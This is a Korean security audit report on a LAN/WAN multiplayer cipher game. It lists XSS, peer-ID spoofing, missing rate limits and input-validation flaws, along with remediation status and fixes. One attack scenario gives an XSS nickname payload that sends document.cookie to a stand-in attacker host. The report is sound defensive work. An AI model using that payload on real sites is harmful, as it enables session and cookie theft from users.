# 암호화 대전 — 보안 취약점 분석 보고서

> **작성일**: 2026-05-20  
> **최종 수정**: 2026-05-20 (branch_5 — 수정 현황 반영)  
> **분석 대상**: `project/server.py`, `project/js/*.js`, `project/src.html`  
> **분석 범위**: 입력 검증, 인증/인가, XSS, 게임 로직 조작, 네트워크 보안, DoS

---

## 수정 현황 요약

| ID | 등급 | 취약점 | 상태 |
|----|------|--------|------|
| C-1 | Critical | 브로드캐스트에 정답 포함 | ✅ 수정 완료 |
| C-2 | Critical | 닉네임 XSS (innerHTML) | ✅ 수정 완료 |
| C-3 | Critical | 암호화 키 미검증 | ✅ 수정 완료 |
| H-1 | High | 피어 ID 스푸핑 (LAN) | ✅ 부분 수정 (형식 검증) |
| H-2 | High | 플레이어 인가 없음 | ⏳ 미수정 (세션 토큰 필요) |
| H-3 | High | WebSocket 속도 제한 없음 | ✅ 수정 완료 |
| H-4 | High | 닉네임 길이/형식 미검증 | ✅ 수정 완료 |
| M-1 | Medium | 평문 WebSocket (ws://) | ⏳ 미수정 (TLS 인증서 필요) |
| M-2 | Medium | CORS 와일드카드 허용 | ✅ 수정 완료 |
| M-3 | Medium | 피어 ID 엔트로피 부족 | ✅ 수정 완료 |
| M-4 | Medium | 메서드 ID 범위 미검증 | ✅ 수정 완료 |
| M-5 | Medium | Slowloris 취약점 | ✅ 기수정 확인 (settimeout 존재) |
| L-1 | Low | 피어 ID 열거 가능 | ✅ 수정 완료 |
| L-2 | Low | localStorage 서버 주소 저장 | — 수용 (XSS C-2 수정으로 위험도 제거) |
| L-3 | Low | 리액션 페이로드 미검증 | ✅ 수정 완료 |
| L-4 | Low | 방 코드 형식 미검증 | ✅ 수정 완료 |

---

## 미수정 항목 — 미보완 사유 기록

### H-2 — 플레이어 인가 없음 (세션 토큰 미도입)

**결정**: 미수정 (수용)

#### 취약점 요약
현재 호스트는 `fromId`(피어 ID)만으로 행동 주체를 식별한다. LAN 모드에서 H-1(ID 스푸핑)과 결합하면 `fromId`를 위조해 다른 플레이어의 출제·해독 제출을 대신 전송할 수 있다.

#### 보완 방법 (이론)
가입 시 호스트(또는 서버)가 서명된 세션 토큰을 발급하고, 이후 모든 액션 메시지(`enc_submit`, `guess_submit` 등)에 해당 토큰을 포함시켜 검증한다.

#### 미보완 사유

1. **WAN 모드에서 효과 없음**  
   WAN 모드(PeerJS)는 `server.py`를 완전히 우회하고 PeerJS STUN 서버를 통해 직접 P2P 연결한다. 토큰 발급 주체가 없으므로 WAN 모드에서는 세션 토큰을 적용할 수 없다. LAN 모드 전용으로 구현하면 두 모드의 코드 경로가 분리되어 유지보수 부담이 커진다.

2. **타이밍 경쟁 조건 발생 가능**  
   클라이언트가 WebSocket `open` 이벤트를 받는 시점과 서버의 토큰 응답이 도착하는 시점 사이에 `join` 메시지가 먼저 전송되면 인가 실패가 발생한다. 비동기 타이밍을 명시적으로 처리하지 않으면 정상적인 접속도 차단될 수 있다.

3. **재연결 로직과 충돌**  
   현재 `lobby.js`에는 호스트 ID 충돌 시 최대 8회 재시도(`hostCreateRetries`)하는 재연결 로직이 있다. 세션 토큰이 재연결 시 무효화되면 재연결이 불가능해지고, 토큰을 갱신하는 절차를 별도로 구현해야 한다.

4. **변경 범위가 너무 넓음**  
   `lobby.js` (가입 흐름), `data.js` (모든 메시지 핸들러), `network.js` (WsPeer/PeerJS 추상화), `server.py` (토큰 발급·검증) 전체에 걸친 수정이 필요하다. 이는 기존 재연결·동기화 로직과 상호작용하며 새로운 버그를 도입할 위험이 높다.

5. **실제 위협 수준**  
   공격자가 H-2를 악용하려면 이미 같은 LAN에 접속해 있고, 다른 플레이어의 피어 ID를 파악한 뒤, 정확한 타이밍에 위조 메시지를 전송해야 한다. H-1이 부분 수정(ID 형식 검증)된 현재 상태에서 실질적인 공격 난이도는 높다. 이 게임의 주요 사용 시나리오(친구들 간 파티 게임)에서 이 공격이 발생할 가능성은 낮다.

#### 향후 수정 시 고려사항
- WAN/LAN 공통으로 적용하려면, 호스트가 게임 내 자체 토큰(HMAC-SHA256 등)을 `join_ok` 응답 시 발급하고, 클라이언트가 이를 로컬 저장 후 모든 메시지에 첨부하는 구조가 적합하다.
- `server.py`가 아닌 **호스트 JS**에서 토큰을 생성하면 WAN/LAN 모드 분기 없이 통합 구현이 가능하다.

---

### M-1 — 평문 WebSocket (TLS 미적용)

**결정**: 미수정 (수용, 문서 명시로 대체)

#### 취약점 요약
LAN 모드의 WebSocket 연결이 `ws://`(평문)으로 전송된다. 같은 네트워크의 제3자가 Wireshark 등으로 트래픽을 캡처하면 암호문, 키값, 플레이어 닉네임 등이 노출된다. WAN 모드(PeerJS/WebRTC)는 DTLS로 암호화되어 있어 해당 없음.

#### 보완 방법 (이론)
`server.py`에 `ssl.SSLContext`를 적용해 `wss://`로 전환하고, `network.js`의 URL 생성 부분을 `wss://`로 변경한다.

#### 미보완 사유

1. **브라우저의 자체 서명 인증서 차단**  
   공인 CA 인증서 없이 자체 서명(self-signed) 인증서를 사용하면, 최신 Chrome·Firefox·Edge는 WebSocket `wss://` 연결 시도 자체를 차단하거나 사용자가 수동으로 예외를 추가해야 한다. LAN 환경에서 `localhost`가 아닌 IP 주소(`192.168.x.x`)로 접속 시 예외 추가도 쉽지 않다.

2. **stdlib 전용 배포 정책과 충돌**  
   현재 `server.py`는 Python 표준 라이브러리만 사용하며, PyInstaller로 단일 `.exe`로 배포한다. TLS를 적용하려면 인증서 파일(`.crt`, `.key`)을 번들에 포함하고, `ssl.SSLContext`의 인증서 로딩 경로를 `sys._MEIPASS`에 맞게 처리해야 한다. 이는 배포 구조를 복잡하게 만든다.

3. **인증서 관리 부담**  
   자체 서명 인증서는 만료 기간이 있어 주기적으로 갱신해야 한다. 공인 인증서(Let's Encrypt 등)는 LAN 전용 사설 IP에 발급할 수 없다. 결과적으로 인증서 배포와 갱신을 수동으로 관리해야 하며, 사용자 경험을 저해한다.

4. **실제 위협 수준**  
   LAN 트래픽 스니핑은 물리적으로 같은 네트워크에 연결된 상태에서 패킷 캡처 도구를 실행해야 한다. 이 게임의 주요 사용 시나리오(가정 내 파티, 교실 내 게임)에서 이 공격이 실행될 가능성은 낮다. 또한 노출되는 정보가 게임 데이터(암호문, 닉네임)이므로 개인정보나 인증 정보 유출로 이어지지 않는다.

#### 향후 수정 시 고려사항
- 공인 도메인이 생긴다면 Let's Encrypt 인증서를 적용해 `wss://`로 전환할 수 있다.
- 단기 대안으로 Cloudflare Tunnel이나 ngrok을 통한 HTTPS 프록시를 사용하면 인증서 없이 암호화된 연결을 제공할 수 있다.
- 현재 상태에서는 **README에 "신뢰할 수 있는 네트워크에서만 사용"을 명시**하는 것으로 위험을 사용자에게 고지한다.

---

## 취약점 요약 (최초 발견 시)

| 등급 | 건수 |
|------|------|
| **Critical** | 3 |
| **High** | 4 |
| **Medium** | 5 |
| **Low** | 4 |

---

## Critical

---

### C-1. 게임 상태 브로드캐스트에 정답 포함

**파일**: `js/data.js`  
**관련 함수**: `broadcast()`

```javascript
function broadcast() {
  const msg = { type: 'sync', state: gameState };
  Object.values(connections).forEach(c => c.send(msg));
}
```

`gameState`에는 `currentRaw`(원문 정답), `currentEncSteps`(중간 암호화 결과), `currentKeys`(키값)가 포함된다. 이 전체 객체가 해독 단계 중에도 모든 플레이어에게 그대로 전송된다.

**공격 시나리오**: 브라우저 콘솔에서 `gameState.currentRaw` 만 입력하면 정답을 즉시 확인할 수 있다. 별도 도구 없이 게임 내에서 바로 치팅 가능.

**조치**: 해독 단계에서는 `currentRaw`, `currentKeys`, `currentEncSteps`를 브로드캐스트 페이로드에서 제외하고, 라운드 종료 시점에만 공개한다.

---

### C-2. DOM 기반 XSS (닉네임 미이스케이프)

**파일**: `js/render.js`

```javascript
card.innerHTML = `
  <div class="player-name">${p.nick}${isMe ? `<span class="my-badge">나</span>` : ''}</div>
`;
```

닉네임이 `innerHTML`에 직접 삽입된다. 입력 제한이 없으므로 악성 닉네임을 다른 플레이어에게 전파할 수 있다.

**공격 시나리오**:
```
닉네임 입력: <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```
이 닉네임이 브로드캐스트되면 모든 플레이어 화면에서 자바스크립트가 실행된다.

동일 패턴이 render.js 내 여러 곳에서 반복됨 (순위판, 게임 오버 화면 등).

**조치**: `innerHTML` 대신 `textContent`를 사용하거나 닉네임에 HTML 이스케이프 함수를 적용한다.

```javascript
function escapeHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
```

---

### C-3. 암호화 키 미검증 → 게임 로직 우회

**파일**: `js/data.js`  
**관련 코드**: `enc_submit` 핸들러

```javascript
const { raw, methods, steps, keys } = data;
// ...
gameState.currentKeys = keys || {};
```

클라이언트가 제출한 `keys`, `methods`, `steps`를 그대로 신뢰한다. 서버는 클라이언트가 보낸 키로 암호화 결과를 검증하므로, 클라이언트가 키-결과 쌍을 함께 조작하면 통과된다.

**공격 시나리오**: 클라이언트가 임의의 `raw`, `keys`, `steps`를 조합해 제출. 서버는 제출된 키로 재계산 → 일치 → 정상 처리. 출제자가 다른 플레이어에게 불가능한 암호문을 제시할 수 있다.

추가로 키에 극단값(음수, `Infinity`, `NaN`, 빈 문자열)을 넣으면 `cipher.js`의 암호화 함수에서 예외 또는 무한 루프가 발생할 수 있다.

**조치**:
- 메서드 ID는 `[0, 1, 2, 3]` 내 정수인지 검증
- 키값은 방식별 허용 범위로 제한 (카이사르: 1–25, 스키테일: 2–10 등)
- 원문 길이 제한 적용

---

## High

---

### H-1. 피어 ID 스푸핑 (LAN 모드)

**파일**: `server.py`

```python
qs = parse_qs(urlparse(path).query)
requested = (qs.get('id', [None])[0] or '').strip()
if not requested or requested == '__random__':
    peer_id = 'py-' + uuid.uuid4().hex[:10]
else:
    peer_id = requested  # 클라이언트가 요청한 ID를 그대로 사용
```

클라이언트가 URL에 `?id=<임의의값>`을 붙이면 서버는 해당 ID로 등록한다. 이미 사용 중인 ID가 아니면 아무 ID나 선점 가능하다.

**공격 시나리오**: 다른 플레이어가 연결을 끊는 순간 해당 ID로 즉시 재연결하면 세션을 탈취한다. 또는 Host ID를 선점해 호스트 권한을 가로챈다.

**조치**: 서버에서 ID를 직접 생성하고 클라이언트 요청 ID를 무시한다. 재연결이 필요하면 세션 토큰 방식으로 처리한다.

---

### H-2. 플레이어 인가 없음 (Host만 처리)

**파일**: `js/data.js`

```javascript
if (data.type === 'enc_submit') {
  if (gameState.phase !== 'encoding') return;
  const encoder = gameState.turnOrder[...];
  if (fromId !== encoder) return;  // fromId 검증만 수행
```

`fromId`는 P2P 연결의 페어 ID다. LAN 모드에서 `fromId`는 서버가 릴레이하는 값이며, H-1 취약점과 결합하면 완전히 우회할 수 있다. WAN 모드(PeerJS)에서도 피어 ID는 추측 가능한 문자열이다.

**공격 시나리오**: 출제 차례가 아닌 플레이어가 현재 출제자 ID를 파악해 `enc_submit` 메시지를 위조하면 다른 플레이어의 차례를 대신 제출할 수 있다.

**조치**: 세션 가입 시 서버에서 서명한 토큰을 발급하고, 모든 액션 메시지에 이 토큰을 포함시켜 검증한다.

---

### H-3. WebSocket 메시지 속도 제한 없음

**파일**: `server.py`

```python
if length > MAX_WS_MSG:  # 2MB 크기 제한만 있음
    return None
# 초당 메시지 수 제한 없음
```

메시지 빈도 제한이 없으므로 하나의 클라이언트가 초당 수천 개의 메시지를 전송할 수 있다. 서버는 이를 모두 다른 피어에게 릴레이한다.

**공격 시나리오**: 악의적인 클라이언트가 작은 `reaction` 메시지를 초당 10,000회 전송 → 서버가 모든 플레이어에게 릴레이 → 다른 플레이어 브라우저 렉/다운.

**조치**: 연결별 토큰 버킷 방식으로 속도 제한 적용 (예: 초당 20 메시지).

---

### H-4. 닉네임 입력 길이/형식 미검증

**파일**: `js/data.js`  
**파일**: `js/lobby.js`

```javascript
gameState.players[fromId] = { nick: data.nick, score: 0, online: true };
```

닉네임 길이 제한이 없고, 내용 검증이 없다. 중복 체크는 있지만 길이, 특수문자, 빈 문자열 등은 허용된다.

**공격 시나리오**: 1MB짜리 닉네임 제출 → 게임 상태에 저장 → 모든 플레이어에게 매 1초마다 브로드캐스트 → 네트워크/메모리 낭비. C-2(XSS)의 전제 조건이기도 하다.

**조치**: 서버(Host) 측에서 닉네임을 수신할 때 길이(예: 최대 20자) 및 허용 문자를 검증한다.

---

## Medium

---

### M-1. 비암호화 WebSocket (ws://)

**파일**: `js/network.js`

```javascript
return 'ws://' + host + ':' + port;
```

LAN 모드의 WebSocket 연결이 평문(ws://)으로 전송된다. 같은 네트워크의 누구나 게임 트래픽을 스니핑할 수 있다.

**공격 시나리오**: 카페 Wi-Fi 환경에서 Wireshark로 패킷 캡처 → 정답, 키값, 플레이어 ID 전부 노출.

**참고**: WAN 모드(PeerJS)는 WebRTC를 사용하므로 DTLS로 암호화됨. LAN 모드만 해당.

**조치**: `server.py`에 TLS 지원을 추가하거나(자체 서명 인증서), 로컬 환경 한정임을 문서에 명시한다.

---

### M-2. CORS 전체 허용

**파일**: `server.py`

```python
'Access-Control-Allow-Origin: *\r\n'
```

모든 출처에서 API 엔드포인트 접근 가능. `/api/info`가 서버 IP와 포트를 반환하므로 외부 사이트에서 서버 주소를 탐색할 수 있다.

**조치**: `Access-Control-Allow-Origin`을 `localhost` 또는 특정 출처로 제한한다.

---

### M-3. 피어 ID 엔트로피 부족

**파일**: `server.py`

```python
peer_id = 'py-' + uuid.uuid4().hex[:10]  # 40비트 엔트로피
```

10자 hex = 40비트. 동시 접속자가 많지 않은 환경이지만, UUID 전체(128비트) 대신 앞 10자만 사용해 충돌 및 예측 가능성이 높아진다.

**조치**: `uuid.uuid4().hex` 전체(32자) 사용.

---

### M-4. 메서드 ID 범위 미검증

**파일**: `js/data.js`, `js/cipher.js`

```javascript
// data.js
for (let i = 0; i < methods.length; i++) {
  const mId = methods[i];
  expectedResult = applyEnc(expectedResult, mId, key);  // mId 범위 검사 없음
}

// cipher.js
export function applyEnc(s, method, key) {
  if (method === 0) return keyEnc(s, key);
  if (method === 1) return anagramEnc(s, key);
  if (method === 2) return caesarEnc(s, key);
  if (method === 3) return scytaleEnc(s, key);
  return s;  // 잘못된 mId는 조용히 무시
}
```

범위 밖의 mId는 조용히 무시되어 암호화 없이 통과된다. 공격자가 `methods: [999]`를 제출하면 암호화 없이 원문이 그대로 암호문으로 통과된다.

**조치**: `methods` 배열의 각 값이 `[0, 1, 2, 3]` 내의 정수인지 서버 측에서 검증.

---

### M-5. Slowloris 취약점 (HTTP 헤더 파싱)

**파일**: `server.py`

```python
while b'\r\n\r\n' not in raw:
    chunk = conn.recv(4096)
    if not chunk:
        return
    raw += chunk
conn.settimeout(None)
```

HTTP 헤더가 완성되기 전에 소켓 타임아웃을 설정하지 않아, 헤더를 천천히 전송하는 클라이언트가 스레드를 계속 점유한다.

**조치**: 헤더 수신 전에 타임아웃(예: 5초)을 설정한다.

```python
conn.settimeout(5)
while b'\r\n\r\n' not in raw:
    ...
conn.settimeout(None)
```

---

## Low

---

### L-1. 피어 ID 열거 가능

**파일**: `server.py`

```python
ws_send_json(conn, {
    'type': 'error',
    'errType': 'unavailable-id',
    'message': f'{peer_id} is taken'
})
```

ID 충돌 시 에러 메시지가 "taken"임을 명시적으로 알려줘 활성 플레이어 ID를 탐색할 수 있다.

**조치**: 에러 메시지를 `"연결 실패"` 등 구체적이지 않은 내용으로 변경.

---

### L-2. localStorage에 서버 주소 평문 저장

**파일**: `js/settings.js`

```javascript
localStorage.setItem('enc_ws_host', host);
localStorage.setItem('enc_ws_port', port || '9000');
```

서버 호스트/포트가 브라우저 로컬 스토리지에 저장된다. XSS(C-2)가 발생하면 이 값도 함께 노출된다.

**조치**: 민감한 설정이 아니므로 현재 위험도는 낮으나, XSS 방어(C-2) 조치를 우선 적용.

---

### L-3. 리액션 페이로드 미검증

**파일**: `js/data.js`

```javascript
if (data.type === 'reaction') {
  Object.entries(connections).forEach(([id, c]) => { if (id !== fromId) c.send(data); });
  showFloatingReaction(data.emoji);
}
```

`data.emoji`에 대한 검증 없이 모든 클라이언트에 릴레이된다. 매우 긴 문자열이나 이상한 유니코드가 UI 렌더링에 영향을 줄 수 있다.

**조치**: `emoji` 값을 허용 목록(화이트리스트) 이모지로 제한.

---

### L-4. 방 코드 형식 미검증

**파일**: `js/lobby.js`

```javascript
roomId = 'CGv4-' + val;
```

입력값에 대한 길이 또는 형식 검증이 없다. 영향은 낮지만 클라이언트 측 방어 코드 부재.

**조치**: 방 코드를 영숫자 4–8자로 제한.

---

## 우선 조치 순서

| 우선순위 | 취약점 | 난이도 |
|---------|-------|-------|
| 1 | C-1: 브로드캐스트에서 정답 제거 | 낮음 |
| 2 | C-2: 닉네임 XSS (innerHTML → textContent) | 낮음 |
| 3 | H-4: 닉네임 길이/형식 검증 추가 | 낮음 |
| 4 | C-3: 키값 범위 및 메서드 ID 검증 | 낮음 |
| 5 | M-4: 메서드 ID 화이트리스트 | 낮음 |
| 6 | H-3: WebSocket 메시지 속도 제한 | 중간 |
| 7 | M-5: Slowloris 방어 (소켓 타임아웃) | 낮음 |
| 8 | H-1: 서버 측 피어 ID 생성 | 중간 |
| 9 | H-2: 플레이어 액션 인가 토큰 | 높음 |

---

## 비고

이 게임은 친구들 간의 소규모 LAN 파티 또는 신뢰할 수 있는 그룹 내 WAN 플레이를 주요 시나리오로 한다. 그 맥락에서:

- C-1, C-2, C-3, H-4는 신뢰 그룹 내에서도 발생할 수 있는 치팅/실수이므로 반드시 수정 권장.
- H-1, H-2 (세션 탈취, 위조)는 악의적 의도가 있어야 하므로 우선순위는 상대적으로 낮다.
- M-1 (평문 WebSocket)은 공용 Wi-Fi 사용 시 위험하므로 사용 환경을 문서에 명시한다.
